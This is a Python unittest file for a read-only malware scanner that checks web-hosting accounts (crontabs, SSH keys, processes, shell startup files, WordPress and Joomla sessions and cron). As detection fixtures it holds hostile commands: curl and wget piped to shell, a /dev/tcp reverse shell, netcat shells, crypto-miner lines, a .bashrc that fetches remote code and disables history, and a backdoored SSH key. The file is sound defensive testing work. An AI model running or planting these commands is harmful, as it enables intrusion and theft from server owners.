"""Konto-Prüfungen: Cronjobs, SSH-Schlüssel, Prozesse, Start-Dateien, Sitzungen, WP-Cron, Joomla-API. Sauber und infiziert, nur lesend, keine Geheimnisse."""
import json
import os
import sqlite3
import stat
import sys
import tempfile
import threading
import time
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
sys.path.insert(0, os.path.dirname(HERE))

import fixture  # noqa: E402
import wpfixture  # noqa: E402
from claudia.checks import konto  # noqa: E402
from claudia.engine import Engine, Settings  # noqa: E402
from claudia.registry import load_all, ordered  # noqa: E402
from claudia.runner import LocalRunner  # noqa: E402

ADV = json.load(open(os.path.join(os.path.dirname(HERE), "claudia", "advisories.json"), encoding="utf-8"))
load_all()
SEC = "ZUGANGSGEHEIMNIS-12345"

FAKE_CRONTAB = """#!/bin/sh
f="$HOME/.fake_crontab"
if [ -f "$f" ]; then cat "$f"; exit 0; fi
echo "no crontab for test" >&2; exit 1
"""
FAKE_KEYGEN = """#!/usr/bin/env python3
import sys
p = sys.argv[-1]
n = 0
for ln in open(p):
    ln = ln.strip()
    if not ln or ln.startswith('#'):
        continue
    n += 1
    parts = ln.split()
    i = [k for k, x in enumerate(parts) if x.startswith(('ssh-', 'ecdsa-', 'sk-'))][0]
    typ = parts[i]
    com = parts[i + 2] if len(parts) > i + 2 else ''
    if typ == 'ssh-rsa' and 'schwach' in com:
        print('1024 SHA256:SCHWACH%d %s (RSA)' % (n, com))
    elif typ == 'ssh-rsa':
        print('3072 SHA256:FINGER%d %s (RSA)' % (n, com))
    else:
        print('256 SHA256:FINGER%d %s (ED25519)' % (n, com))
"""
FAKE_PS = """#!/bin/sh
case "$*" in
  *"args="*) cat "$HOME/.fake_ps" 2>/dev/null ;;
  *) awk '{print $1}' "$HOME/.fake_ps" 2>/dev/null ;;
esac
"""


def install(bin_dir, name, text):
    p = os.path.join(bin_dir, name)
    with open(p, "w") as fh:
        fh.write(text)
    os.chmod(p, 0o755)


def world(infected, wp=False):
    base = tempfile.mkdtemp(prefix="claudia_konto_")
    w = wpfixture.make_wp_world(base, infected) if wp else fixture.make_world(base, infected)
    install(w["bin"], "crontab", FAKE_CRONTAB)
    install(w["bin"], "ssh-keygen", FAKE_KEYGEN)
    install(w["bin"], "ps", FAKE_PS)
    return w


def run(w, cid, cms="joomla"):
    s = Settings(site_dir=w["site_rel"], log_dir="logs", cms=cms, url="", allow_hosts=ADV["allow_hosts"])
    eng = Engine(LocalRunner(w["home"], extra_path=w["bin"]), s, ADV)
    return eng.run([cid], lambda e: None, threading.Event())[0]


def put(w, rel, text, mode=0o644, days=1):
    return fixture.w(os.path.join(w["home"], rel), text, days_ago=days, mode=mode)


def tt(r):
    return [(f.sev, f.title) for f in r.findings]


def blob(r):
    return json.dumps(r.to_dict() if hasattr(r, "to_dict") else r.__dict__, default=str, ensure_ascii=False)


class Patterns(unittest.TestCase):
    def test_critical(self):
        for line in ["* * * * * curl -s http://x.example/a.sh | sh", "*/5 * * * * wget -qO- http://x.example/p | bash", "@hourly echo aGk= | base64 -d | sh",
                     "* * * * * php -r 'echo 1;'", "* * * * * python3 -c 'import os'", "* * * * * perl -e 'print 1'", "bash -i >& /dev/tcp/1.2.3.4/80 0>&1",
                     "* * * * * nc -e /bin/sh 1.2.3.4 99", "* * * * * /tmp/xmrig -o stratum+tcp://pool", 'eval "$(curl -s http://x.example/y)"']:
            self.assertEqual(konto.judge_cmd(line)[0], "crit", line)

    def test_normal_lines_not_flagged(self):
        for line in ["*/15 * * * * /usr/bin/php /home/u/html/cli/joomla.php scheduler:run", "*/5 * * * * cd /home/u/html && php wp-cron.php", "0 3 * * * curl -s https://example.org/wp-cron.php?doing_wp_cron",
                     "0 2 * * * mysqldump -u u -p'x' db | gzip > /home/u/backup.sql.gz", 'eval "$(dircolors -b ~/.dircolors)"', 'eval "$(ssh-agent -s)"',
                     "alias ll='ls -alF'", 'export PATH="$HOME/bin:$PATH"', "0 4 * * 1 /usr/bin/php /home/u/html/artisan schedule:run"]:
            self.assertEqual(konto.judge_cmd(line)[0], "", line)

    def test_warn(self):
        for line in ["* * * * * /tmp/x/run.sh", "* * * * * php /home/u/html/images/a.php", "* * * * * /home/u/.cache/x.sh", "* * * * * wget -q http://h/x -O /tmp/x"]:
            self.assertEqual(konto.judge_cmd(line)[0], "warn", line)

    def test_mask(self):
        for t in ["mysqldump -u u -pHUNTER2 db", "curl https://u:HUNTER2@host/x", "curl 'https://h/x?token=HUNTER2&a=1'", "tool --password=HUNTER2", "tool --password HUNTER2", "x password=HUNTER2"]:
            self.assertNotIn("HUNTER2", konto.mask_cmd(t), t)

    def test_etime_and_parse(self):
        self.assertEqual(konto.etime_seconds("05:03"), 303)
        self.assertEqual(konto.etime_seconds("2-01:00:01"), 2 * 86400 + 3601)
        out = "@@PS\n 10 1 02:00:00 php /home/u/x.php\n 11 1 1-00:00:00 /tmp/.x/miner\n@@EXE\n11 /tmp/.x/miner (deleted)\n@@END\n"
        p = konto.parse_procs(out)
        self.assertEqual(len(p["procs"]), 2)
        self.assertIn(11, p["deleted"])

    def test_wp_sessions_and_cron_parse(self):
        v = 'a:2:{s:64:"' + "a" * 64 + '";a:4:{s:10:"expiration";i:9999999999;s:2:"ip";s:7:"1.2.3.4";s:2:"ua";s:5:"Agent";s:5:"login";i:100;}s:64:"' + "b" * 64 + '";a:4:{s:10:"expiration";i:9999999999;s:2:"ip";s:7:"5.6.7.8";s:2:"ua";s:1:"x";s:5:"login";i:200;}}'
        s = konto.parse_wp_sessions(v)
        self.assertEqual([x["ip"] for x in s], ["1.2.3.4", "5.6.7.8"])
        cron = 'a:2:{i:1;a:1:{s:16:"wp_version_check";a:1:{s:32:"' + "c" * 32 + '";a:3:{s:8:"schedule";s:10:"twicedaily";s:4:"args";a:0:{}s:8:"interval";i:43200;}}}s:7:"version";i:2;}'
        self.assertEqual(konto.parse_cron_hooks(cron), ["wp_version_check"])

    def test_keys_parse_no_key_text(self):
        out = "@@DIR\n700 u 5\n@@FILE authorized_keys\n600 u 100 200\n@@LIST\n256 SHA256:abc me@pc (ED25519)\n@@OPT\n-\ncommand=\"/bin/x\",no-pty \n@@COUNT\n2\n@@END\n"
        p = konto.parse_keys(out)
        f = p["files"]["authorized_keys"]
        self.assertEqual(f["keys"][0]["fp"], "SHA256:abc")
        self.assertEqual(f["count"], 2)
        self.assertTrue(any("command" in o for o in f["options"]))


class Clean(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.w = world(False)
        put(cls.w, ".fake_crontab", "# m h dom mon dow command\nMAILTO=me@example.org\n*/15 * * * * /usr/bin/php /home/test/html/site/cli/joomla.php scheduler:run\n")
        os.makedirs(os.path.join(cls.w["home"], ".ssh"), exist_ok=True)
        os.chmod(os.path.join(cls.w["home"], ".ssh"), 0o700)
        put(cls.w, ".ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGEHEIMER_SCHLUESSELTEXT_NICHT_AUSGEBEN meinpc\n", 0o600, days=400)
        put(cls.w, ".fake_ps", "100 1 05:00 sshd: u@pts/0\n200 100 00:10 -bash\n300 1 00:30 /usr/bin/php-fpm8.2 --daemonize\n")
        put(cls.w, ".bashrc", '# ~/.bashrc\nalias ll="ls -alF"\neval "$(dircolors -b)"\nexport PATH="$HOME/bin:$PATH"\n', days=400)

    def test_crontab_ok(self):
        r = run(self.w, "crontab")
        self.assertNotIn(r.status, ("skipped", "error"), r.__dict__)
        self.assertFalse([f for f in r.findings if f.sev in ("warn", "crit")], tt(r))

    def test_keys_ok_and_no_key_text(self):
        r = run(self.w, "authorized_keys")
        self.assertFalse([f for f in r.findings if f.sev in ("warn", "crit")], tt(r))
        self.assertNotIn("SCHLUESSELTEXT", blob(r))
        self.assertTrue(any("FINGER1" in " ".join(f.items) for f in r.findings))

    def test_processes_ok(self):
        r = run(self.w, "processes")
        self.assertFalse([f for f in r.findings if f.sev in ("warn", "crit")], tt(r))

    def test_startup_ok(self):
        r = run(self.w, "shell_startup")
        self.assertEqual([f for f in r.findings if f.sev in ("warn", "crit")], [], tt(r))

    def test_no_crontab_is_ok(self):
        w = world(False)
        r = run(w, "crontab")
        self.assertEqual(tt(r)[0][0], "ok", tt(r))

    def test_crontab_forbidden_is_not_checkable(self):
        w = world(False)
        install(w["bin"], "crontab", "#!/bin/sh\necho 'You (u) are not allowed to use this program (crontab)' >&2\nexit 1\n")
        r = run(w, "crontab")
        self.assertEqual(tt(r)[0][0], "info", tt(r))
        self.assertIn("nicht prüfbar", tt(r)[0][1])

    def test_ps_missing_is_not_checkable(self):
        w = world(False)
        install(w["bin"], "ps", "#!/bin/sh\nexit 1\n")
        r = run(w, "processes")
        self.assertIn("nicht prüfbar", tt(r)[0][1])


class Infected(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.w = world(True)
        put(cls.w, ".fake_crontab", "*/5 * * * * curl -s http://evil.example/a.sh?key=%s | sh\n*/9 * * * * /tmp/.x/run.sh\n0 3 * * * mysqldump -u u -p%s db > /home/u/x.sql\n" % (SEC, SEC))
        os.makedirs(os.path.join(cls.w["home"], ".ssh"), exist_ok=True)
        os.chmod(os.path.join(cls.w["home"], ".ssh"), 0o777)
        put(cls.w, ".ssh/authorized_keys", 'command="/home/u/.x/bd.sh",no-pty ssh-ed25519 AAAAGEHEIMER_TEXT_B angreifer\nssh-rsa AAAAGEHEIMER_TEXT_C schwach\n', 0o666, days=1)
        put(cls.w, ".fake_ps", "100 1 05:00 sshd: u@pts/0\n400 1 3-02:00:00 /tmp/.x/xmrig -o stratum+tcp://pool.example:3333 -p %s\n401 1 4-00:00:00 php /home/u/images/loop.php\n" % SEC)
        put(cls.w, ".bashrc", 'alias ls="/tmp/.x/ls"\nexport HISTFILE=/dev/null\n(curl -s http://evil.example/p | bash) &\neval "$(dircolors -b)"\n', days=1)

    def test_crontab(self):
        r = run(self.w, "crontab")
        self.assertIn("crit", [s for s, _ in tt(r)])
        self.assertIn("warn", [s for s, _ in tt(r)])
        self.assertNotIn(SEC, blob(r))
        self.assertIn("***", blob(r))

    def test_keys(self):
        r = run(self.w, "authorized_keys")
        titles = " | ".join(t for _, t in tt(r))
        self.assertIn("geändert", titles)
        self.assertIn("erzwungenem Befehl", titles)
        self.assertIn("schwache", titles)
        self.assertIn("beschreibbar", titles)
        self.assertNotIn("GEHEIMER_TEXT", blob(r))

    def test_processes(self):
        r = run(self.w, "processes")
        self.assertIn("crit", [s for s, _ in tt(r)])
        self.assertIn("warn", [s for s, _ in tt(r)])
        self.assertNotIn(SEC, blob(r))

    def test_startup(self):
        r = run(self.w, "shell_startup")
        self.assertEqual(tt(r)[0][0], "crit", tt(r))
        text = blob(r)
        self.assertIn("alias", text)
        self.assertNotIn("dircolors", text)


class Database(unittest.TestCase):
    def test_wp_sessions(self):
        w = world(True, wp=True)
        con = sqlite3.connect(w["db"])
        far = int(time.time()) + 86400
        sess = "a:4:{" + "".join('s:64:"%s";a:4:{s:10:"expiration";i:%d;s:2:"ip";s:%d:"%s";s:2:"ua";s:1:"x";s:5:"login";i:%d;}' % (("%064x" % i), far, len(ip), ip, int(time.time()) - 100)
                                  for i, ip in enumerate(["1.1.1.1", "2.2.2.2", "3.3.3.3", "4.4.4.4"])) + "}"
        con.execute("DELETE FROM wp_usermeta WHERE meta_key='session_tokens'")
        con.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (1, 'session_tokens', ?)", (sess,))
        con.execute("DELETE FROM wp_usermeta WHERE user_id=1 AND meta_key='wp_capabilities'")
        con.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (1, 'wp_capabilities', 'a:1:{s:13:\"administrator\";b:1;}')")
        con.commit()
        con.close()
        r = run(w, "sessions", "wordpress")
        self.assertNotIn(r.status, ("skipped", "error"), r.__dict__)
        self.assertIn("warn", [s for s, _ in tt(r)], tt(r))
        self.assertNotIn("a" * 20, " ".join(" ".join(f.items) for f in r.findings))     # kein Sitzungsschlüssel

    def test_wp_cron(self):
        w = world(True, wp=True)
        con = sqlite3.connect(w["db"])
        hooks = ["wp_version_check", "eval_runner_task", "geloeschtes_plugin_job"]
        v = "a:1:{i:1;a:3:{" + "".join('s:%d:"%s";a:1:{s:32:"%032x";a:3:{s:8:"schedule";b:0;s:4:"args";a:0:{}s:8:"interval";i:0;}}' % (len(h.encode()), h, i) for i, h in enumerate(hooks)) + "}}"
        con.execute("DELETE FROM wp_options WHERE option_name='cron'")
        con.execute("INSERT INTO wp_options (option_name, option_value, autoload) VALUES ('cron', ?, 'yes')", (v,))
        con.commit()
        con.close()
        r = run(w, "wp_cron", "wordpress")
        self.assertNotIn(r.status, ("skipped", "error"), r.__dict__)
        sev = tt(r)
        self.assertTrue(any(s == "crit" and "verdächtigem Namen" in t for s, t in sev), sev)
        self.assertTrue(any(s == "warn" and "ohne Programmcode" in t for s, t in sev), sev)

    def test_joomla_sessions_filesystem_limit(self):
        w = world(False)
        cfg = os.path.join(w["site"], "configuration.php")
        txt = open(cfg).read().replace("'database'", "'filesystem'")
        os.chmod(cfg, 0o644)  # Fixture: 444, als Nicht-root sonst nicht beschreibbar
        open(cfg, "w").write(txt)
        r = run(w, "sessions")
        self.assertEqual(tt(r)[0][0], "info", tt(r))
        self.assertIn("nicht in der Datenbank", tt(r)[0][1])

    def test_joomla_sessions_database(self):
        w = world(True)
        con = sqlite3.connect(w["db"])
        con.execute("CREATE TABLE IF NOT EXISTS j_session (session_id TEXT, client_id INTEGER, guest INTEGER, time INTEGER, data TEXT, userid INTEGER, username TEXT)")
        for i in range(5):
            con.execute("INSERT INTO j_session VALUES (?, 1, 0, ?, '', ?, ?)", ("s%d" % i, int(time.time()) - i, i, "user%d" % i))
        con.commit()
        con.close()
        r = run(w, "sessions")
        self.assertNotIn(r.status, ("skipped", "error"), r.__dict__)
        self.assertIn("warn", [s for s, _ in tt(r)], tt(r))

    def test_joomla_api(self):
        w = world(True)
        con = sqlite3.connect(w["db"])
        con.execute("INSERT INTO j_extensions (name, type, element, folder, client_id, enabled) VALUES ('plg_user_token', 'plugin', 'token', 'user', 0, 1)")
        con.execute("INSERT INTO j_extensions (name, type, element, folder, client_id, enabled) VALUES ('plg_webservices_content', 'plugin', 'content', 'webservices', 0, 1)")
        con.execute("INSERT INTO j_user_profiles (user_id, profile_key, profile_value, ordering) VALUES (42, 'joomlatoken.token', 'GEHEIMTOKEN', 1)")
        con.commit()
        con.close()
        r = run(w, "joomla_api")
        self.assertNotIn(r.status, ("skipped", "error"), r.__dict__)
        self.assertIn("warn", [s for s, _ in tt(r)], tt(r))
        self.assertNotIn("GEHEIMTOKEN", blob(r))


class AppPasswords(unittest.TestCase):
    def test_parse_and_check(self):
        from claudia.checks import wp
        v = ('a:1:{i:0;a:7:{s:4:"uuid";s:36:"11111111-2222-3333-4444-555555555555";s:6:"app_id";s:0:"";s:4:"name";s:8:"Backdoor";s:8:"password";s:34:"$P$HASHDARFNICHTAUFTAUCHEN12345678";'
             's:7:"created";i:1700000000;s:9:"last_used";i:1700100000;s:7:"last_ip";s:7:"9.9.9.9";}}')
        e = wp.parse_app_passwords(v)
        self.assertEqual((e[0]["name"], e[0]["created"], e[0]["last_used"], e[0]["ip"]), ("Backdoor", 1700000000, 1700100000, "9.9.9.9"))
        self.assertNotIn("HASH", str(e))
        w = world(True, wp=True)
        con = sqlite3.connect(w["db"])
        con.execute("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES (1, '_application_passwords', ?)", (v,))
        con.commit()
        con.close()
        r = run(w, "wp_db_users", "wordpress")
        text = blob(r)
        self.assertIn("Backdoor", text)
        self.assertIn("zuletzt benutzt", text)
        self.assertNotIn("HASHDARF", text)
        self.assertIn("Benutzer mit Anwendungs-Passwörtern", text)


class Registry(unittest.TestCase):
    def test_registered_for_right_systems(self):
        j = {c.id for c in ordered("joomla")}
        wp = {c.id for c in ordered("wordpress")}
        for cid in ("crontab", "authorized_keys", "processes", "shell_startup", "sessions"):
            self.assertIn(cid, j)
            self.assertIn(cid, wp)
        self.assertIn("joomla_api", j)
        self.assertNotIn("joomla_api", wp)
        self.assertIn("wp_cron", wp)
        self.assertNotIn("wp_cron", j)

    def test_all_new_checks_documented(self):
        for cid in ("crontab", "authorized_keys", "processes", "shell_startup", "sessions", "wp_cron", "joomla_api"):
            c = [x for x in ordered("joomla") + ordered("wordpress") if x.id == cid][0]
            for k in ("summary", "what", "why", "reads"):
                self.assertTrue(len(getattr(c, k)) > 40, (cid, k))


class ReadOnly(unittest.TestCase):
    def test_checks_do_not_change_anything(self):
        w = world(True)
        put(w, ".fake_crontab", "* * * * * /tmp/x\n")
        put(w, ".bashrc", "alias ls=x\n")
        os.makedirs(os.path.join(w["home"], ".ssh"), exist_ok=True)
        put(w, ".ssh/authorized_keys", "ssh-ed25519 AAAA k\n", 0o600)

        def snap():
            out = {}
            for root, dirs, files in os.walk(w["home"]):
                for f in files:
                    p = os.path.join(root, f)
                    st = os.stat(p)
                    out[p] = (st.st_size, int(st.st_mtime), stat.S_IMODE(st.st_mode))
            return out
        before = snap()
        for cid in ("crontab", "authorized_keys", "processes", "shell_startup", "sessions", "joomla_api"):
            run(w, cid)
        self.assertEqual(before, snap())


if __name__ == "__main__":
    unittest.main()
